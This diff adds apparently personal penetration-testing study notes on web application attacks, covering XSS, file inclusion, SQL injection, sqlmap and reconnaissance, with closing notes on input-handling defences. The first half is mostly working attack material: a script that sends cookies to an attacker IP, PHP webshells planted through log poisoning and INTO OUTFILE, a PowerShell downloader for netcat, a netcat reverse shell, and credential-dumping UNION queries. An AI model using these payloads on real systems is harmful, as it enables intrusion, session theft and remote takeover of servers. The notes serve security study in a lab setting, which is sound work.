@@ -1,0 +1,325 @@
+Web Applications
+	- Increasing in popularity
+	- Most breaches come from web applications
+	- Dynamic web applications usually have a greater attack surface as the web server often runs server side code
+		○ Depending on the quality of this code and the web server configuration, the integrity of the site could be compromised
+	- Essential Firefox Add-Ons
+		○ Cookies Manager
+		○ Tamper Data
+
+Cross Site Scripting (XSS) 
+	- Caused from unsanitized user input that is then displayed on a web page in HTML format
+	- Don’t directly compromise the machine, but can be used to:
+		○ Steal cookies
+		○ Bypass authentication
+		○ Browser redirection
+	- Can use the <iframe> tag to get info on a client side attack
+		○ Point iframe to your machine and setup netcat listener
+		○ The response you will get will be a GET request for whatever website you put in the iframe, containing information about the target's browser
+	- Stealing Cookies
+		○ Use the following XSS script 
+			<script>new Image().src="http://<attacker IP>/index.php?output="+document.cookie;</script>
+		○ Set up netcat listener on 80
+		○ Response will be a GET request for the page /index.php?output=<stolen_cookie_name=stolen_cookie_value>
+		○ Then can use a cookie editor like Cookies Manager+ to introduce this authenticated session ID cookie into our browser
+		○ Remember that this attack is session specific: it will only work as long as the victim stays logged on with their original session or until their session expires
+		○ XSS attacks are usually leveraged to further compromise a system
+
+File Inclusion Vulnerabilities 
+	- Local (LFI) and Remote (RFI) file inclusion vulnerabilities are commonly found in poorly written PHP code
+		○ Exploitation also depends on PHP version and web server configurations, specifically php.ini values, such as register_globals and allow_url wrappers
+		○ These vulnerabilities allow an attacker to include a remote or local file into the webserver's running PHP code
+	- LFIs are a subclass of RFIs
+		○ Difference between the two is the web application's capability to include either local or remote files
+		○ RFI attacks allow the attacker to introduce his own code to the webserver, resulting in a quick compromise
+		○ LFI attacks limit the attacker to including files already existing on the webserver, making the compromise more challenging
+	- LFI attacks
+		○ Certain PHP parameters that are not sanitized can result in local files on the webserver being executed
+		○ Example is the LANG parameter in the test application
+			§ Options are EN or FR, which then get the <lang_name>.php file
+				□ You can use this to get files on the server
+				□ It will, however, add .php to the end, so add the null byte %00 to the end to prevent it from doing this
+			§ You can contaminate log files to try and get a shell
+				□ Use netcat to get a raw connection to the server
+					® Send:  <?php echo shell_exec($_GET['cmd']);?>
+				□ Then you can add the parameter 'cmd=<command>' to execute commands
+					® addguestbook.php?name=a&comment=b&cmd=ipconfig&LANG=../../../../../../../xampp/apache/logs/access.log%00
+				□ Use a script to use this URL to download and execute netcat with a shell (this is all in the script ps_webshell.py)
+					'echo $storageDir = $pwd > wget.ps1'
+					'echo $webclient = New-Object System.Net.WebClient >>wget.ps1'
+					'echo $url = "http://10.11.0.193/nc.exe" >>wget.ps1'
+					'echo $file = "nc.exe" >>wget.ps1'
+					'echo $webclient.DownloadFile($url,$file) >>wget.ps1'
+					powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
+					nc.exe -nv 10.11.0.193 443 -e cmd.exe
+	- RFI attacks
+		○ Less common
+		○ Example LANG
+			§ http://10.11.1.35/addguestbook.php?name=a&comment=b&LANG=http://10.11.0.193/evil.txt%00
+				□ Request was evil.txt.php was sent unless null byte (%00) was added
+			§ Syntax
+				<?php echo shell_exec("COMMAND");?>
+			§ Remember:
+				□ Add the god damn null byte to the end of the url
+				□ Surround the command with the proper syntax: <?php echo shell_exec("<command>");?>
+
+MySQL SQL Injection 
+	- SQL Injection
+		○ SQL injection is a common web vulnerability found in dynamic sites that is caused by unsanitized user input, which is then passed on to the database
+			§ This user input can be manipulated to "break out" of the original query made by the developers to include more malicious actions
+		○ Could lead to database information leakage and possibly complete server compromise
+		○ Note:
+			§ This is for a PHP/MySQL environment
+			§ Concepts remain the same
+			§ Syntax may differ
+	- Authentication Bypass
+		○ username	wrong' or 1=1 LIMIT 1;#
+		password	doesn’t matter
+			§ This is due to the SQL query that is executed: select * from users where name='passed_name' and password='passed_pass';
+	- Enumerating the Database
+		○ SQL injection attacks can be used to disclose database information using various injected queries
+			§ Most techniques rely on abusing SQL query statements and gathering information about the database structure from the errors'
+		○ order by <num>
+			§ Useful to understand how many columns there are
+		○ When "using union all select", you need to know the number of columns
+			§ It must have the same number of columns as the current table to show any output
+			§ union all select <1>,etc. <-- values are arbitrary, can do 12,13,14,15, which is the same as 1,2,3,4
+		○ Display all table names
+			§ union all select 1,2,3,4,table_name,6 FROM information_schema.tables
+		○ Display all columns in the 'users' table
+			§ union all select 1,2,3,4,column_name,6 FROM information_schema.columns where table_name='users'
+		○ Display username and password
+			§ union select 1,2,3,4,concat(name,0x3a,password),6 FROM users
+	- SQL Injection Code Execution
+		○ OS permissions
+			§ Windows: DB runs as SYSTEM
+			§ Linux: DB runs as lesser user
+		○ Load file with SQL injection
+			§ union all select 1,2,3,4,load_file('C:/Windows/System32/drivers/etc/hosts'),6
+		○ Create a malicious PHP file in the server's web root
+			§ union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/xampp/htdocs/backdoor.php'
+				□ In MySQL syntax: SELECT "<?php echo shell_exec($_GET['cmd']);?>" INTO OUTFILE '/tmp/p.php';
+			§ Usage
+				□ http://10.11.25.61/backdoor.php?cmd=<command>  
+				□ Using scripting, you can easily make this an interactive shell (requests, r.text[10:-1])
+	- Testing Blindly
+		○ Can always introduce a sleep parameter and if the application hangs for a bit, we can deduce that our input is affecting the DB queries
+			§ Eg: id=738-sleep(5)
+			§ Deducing the MySQL version
+				□ Eg: id=738-IF(MID(@@version,1,1) = '5', SLEEP(5), 0)
+
+Web Application Proxies 
+	- On many occasions, a web application may restrict the input given by a user, could be:
+		○ Drop down menu
+		○ JavaScript: check for length of special characters
+	- Tamper Data can be used to get around this
+			
+Full Shell From SQL Injection
+	- Process
+		○ Start with order by <num>
+			§ Find out how many columns there are
+			§ en' order by 6;#
+		○ Then try loading a file in a suitable column
+			§ en' union select 1,2,3,4,load_file('C:/Windows/System32/drivers/etc/hosts'),6;#
+		○ Create webshell
+			§ en' union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/xampp/htdocs/backdoor2.php';#
+		○ Interact with webshell using Python script
+			§ Script uses raw_input and cutting [:] to deliver a web shell
+		○ Upload PowerShell wget for netcat
+			echo $storageDir = $pwd > wget.ps1
+			echo $webclient = New-Object System.Net.WebClient >>wget.ps1
+			echo $url = "http://10.11.0.193/nc.exe" >>wget.ps1
+			echo $file = "nc.exe" >>wget.ps1
+			echo $webclient.DownloadFile($url,$file) >>wget.ps1
+			
+			powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
+			
+			nc.exe -nv 10.11.0.193 443 -e cmd.exe
+		○ Run Netcat
+			§ nc -nvlp 443
+			§ Full shell
+
+Automated SQL Injection Tools 
+	- sqlmap
+		○ Can be used to both identify and exploit SQL injection vulnerabilities
+		○ crawl parameter can be used to enumerate the various pages of our vulnerable web app and have it automatically search for SQL injection vulnerabilities
+			§ sqlmap -u http://10.11.25.61 --crawl=1
+			§ This will find an injection point
+		○ Then use sqlmap to dump the database
+			§ sqlmap -u http://10.11.25.61/comment.php?id=902 --dbms=mysql --dump --threads=5
+		○ More features
+			§ WAF bypass
+			§ Execute complex series of queries that automate a complete takeover of the server
+			§ --os-shell will attempt to automatically upload and execute remote command shell on the target
+			§ Looks for both GET and POST parameters
+		○ Useful flags
+			§ --batch	Automatically take the default option; don't prompt user	
+			--crawl=<num>	Crawl the website and how many links to follow	Can cause SQLmap to quit early if no links are found
+			--dbms=<db>	Specify the DB being used an only use injection command specific to that DB	
+			--os-shell	Will attempt to automatically upload and execute remote command shell on the target	
+			--level=<1-5>	Level of tests to perform	
+			--risk=<1-3>	Level of tests to perform	
+			--dump	Dump DBMS database table entries	
+			--dump-all	Dump all DBMS database table entries	
+
+
+Exercises To Complete Still 
+	4. Use sqlmap in the lab network to gather information on various targets.
+	5. Use sqlmap in the lab network to obtain a shell on a target machine. Can you
+	exploit the SQL injection manually?
+	
+	
+SQL Injection Tutorial
+	1. Determine if SQL injection exists
+	    Try injecting characters reserved in databases to produce error messages
+	
+		    single-quote
+		   back-slash
+		   double-hyphen
+		   forward-slash
+		   period
+	
+	    If error message is produces, examine message for helpful errors, queries, database brand, columns, tables or other information.
+	    If no error message present, send valid data, "true" injections ("or 1=1") and "false" injections ("and 1=0"). Look for difference in the three responses
+	
+		    Technique: Blind SQL Injection - True and False Values
+		    Field: username
+		    True Value (Using Proxy): ' or 1=1 --
+		    False Value (Using Proxy): ' and 1=0 --
+	
+	    If no errors nor differences are produced, try timing attacks ("mysql sleep(), sql server waitfor(), oracle sleep()")
+	
+	    ' union Select null, null, null, sleep(5) -- 
+
+ 2. Determine injection types that work
+
+  UNION statements
+        Determine number of columns in application query. Inject NULL columns until injected query works.
+        Determine position of a varchar or equivalent column
+        Use position of found column(s) to place injected columns. Use NULL for rest
+    Inline injection
+        Usually happens when ORDER BY or HAVING clause present in application query
+    Timing injection
+
+    Technique: Blind SQL Injection - Timing
+    Page: login.php
+    Field: username
+    Value (Using Proxy): ' union Select null, case SUBSTRING(current_user(),1,1) when 'r' THEN sleep(5) ELSE sleep(0) END, null, null --
+    Value (Using Direct Request): username=%27%20union%20Select%20null%2C%20case%20SUBSTRING%28current_user%28%29%2C1%2C1%29%20when%20%27r%27%20THEN%20sleep%285%29%20ELSE%20sleep%280%29%20END%2C%20null%2C%20null%20--%20&password=&login-php-submit-button=1 
+
+
+
+Troy Hunt - Web Application Attacks 
+Understanding Security in Web Applications 
+	- 86% of website tested had at least one serious vulnerability, and most had more than one
+	- 99.9% of the exploited vulnerabilities were compromised more than a year after the CVE was published
+	
+
+Reconnaissance and Footprinting 
+	- Important first step because you need to know how the web app is put together
+		○ => This is mapping the attack surface
+	- Spidering
+		○ Crawling through a website, following every link in the website
+		○ One of the most fundamental principals
+		○ Netsparker is a good spidering tool
+	- Forced browsing (aka directory busting)
+		○ Burp Intercept > Right click on "Raw" request > Send to Intruder
+			§ Positions: select what gets substituted
+			§ Payloads: select what will substitute the selected positions
+		○ Dirb does this in Kali
+	- Directory traversal
+		○ Eg: looking at webapp.local/secret/Report/?fileName=logs.log
+			§ Replace logs.log with foo.log
+			§ There then shows an error message with the code
+				□ No sanitization
+			§ Replacing it further with ../../web.config reveals the web config file
+	- Banner grabbing
+		○ wget --server-response <website>
+	- Nmap Fingerprinting
+		○ nmap -O -A -v
+	- Exposed APIs
+		○ Check out WSDL and help files that can expose sensitive info
+	- CVEs
+
+Tampering Untrusted Data 
+	- Sources of untrusted data (where the attacker can do whatever they want with it)
+		○ Request body
+		○ Request headers
+		○ Query string 
+		○ URL
+		○ HTTP verbs
+			§ Eg:  POST, GET, PUT, PATCH, and DELETE
+		○ External services
+	- Cookie modification with JavaScript
+		○ document.cookie="<cookie_name>=<cookie_value>"
+	- Insecure direct object refernece
+		○ http://site.com/user/account/1
+			§ Could change 1 to 2,3,4,etc
+		○ Banking account number in URL
+
+Attacks Involving the Client 
+
+	- .
+		
+
+
+
+
+Web Application Hacker's Handbook 
+	- What input can the user submit?
+		○ Every URL string up to the query string marker
+		○ Every parameter submitted within the URL query string
+		○ Every parameter submitted within the body of a POST request
+		○ Every cookie
+		○ Every other HTTP header that the application might process — in particular, the User-Agent, Referer, Accept, Accept-Language, and Host headers
+	- Input handling approaches
+		1) Reject known bad
+			i. Blacklist
+			ii. Least effective
+		2) Accept known good
+			i. Whitelist
+			ii. More effective
+			iii. Often not an all-purpose solution
+		3) Sanitization
+			i. Recognizes need to sometimes accept data that cannot be guaranteed as safe
+			ii. Highly effective
+		4) Safe Data Handling
+			i. Ensure that the processing of the data is inherently safe
+			ii. However, cannot be applied to every web app task
+		5) Semantic Checks
+			i. Attempts to validate correct user submitted data
+			ii. Eg: banking web app needs to validate that the account number submitted belongs to the user who has submitted it
+		6) Boundary Validation
+			i. Best overall approach
+			ii. Essentially defense-in-depth: don't trust the data at any stage
+	- Process
+		○ **It may be tempting to dive in and start probing for bugs, but taking time to gain a sound understanding of the application’s functionality, technologies, and attack surface will pay dividends down the line
+
+
+	BEHAVIOR	VULNERABILITY OR FUNCTIONALITY
+	Client-side validation	Checks may not be replicated on the server
+	Database interaction	SQL injection
+	File uploading and downloading	Path traversal vulnerabilities, stored cross-site scripting
+	Display of user-supplied data	Cross-site scripting
+	Dynamic redirects	Redirection and header injection attacks
+	Social networking features	username enumeration, stored cross-site scripting
+	Login	Username enumeration, weak passwords, ability to use bruteforce
+	Multistage login	Logic flaws
+	Session state	Predictable tokens, insecure handling of tokens
+	Access controls	Horizontal and vertical privilege escalation
+	User impersonation functions	Privilege escalation
+	Use of cleartext communications	Session hijacking, capture of credentials and other sensitive data
+	Off-site links	Leakage of query string parameters in the Referer header
+	Interfaces to external systems	Shortcuts in the handling of sessions and/or access controls
+	Error messages	Information leakage
+	E-mail interaction	E-mail and/or command injection
+	Native code components or interaction	Buffer overflows
+	Use of third-party application components	Known vulnerabilities
+	Identifiable web server software known software bugs	Common configuration weaknesses,
+
+
+XSS
+"><script>alert(document.cookie)</script>
+	- This string is submitted as every parameter to every page of the application, and responses are monitored for the appearance of this same string
+	- If cases are found where the attack string appears unmodified within the response, the application is almost certainly vulnerable to XSS.
+	- If your intention is simply to identify some instance of XSS within the application as quickly as possible to launch an attack against other application users, this basic approach is probably the most effective, because it can be easily automated and produces minimal false positives
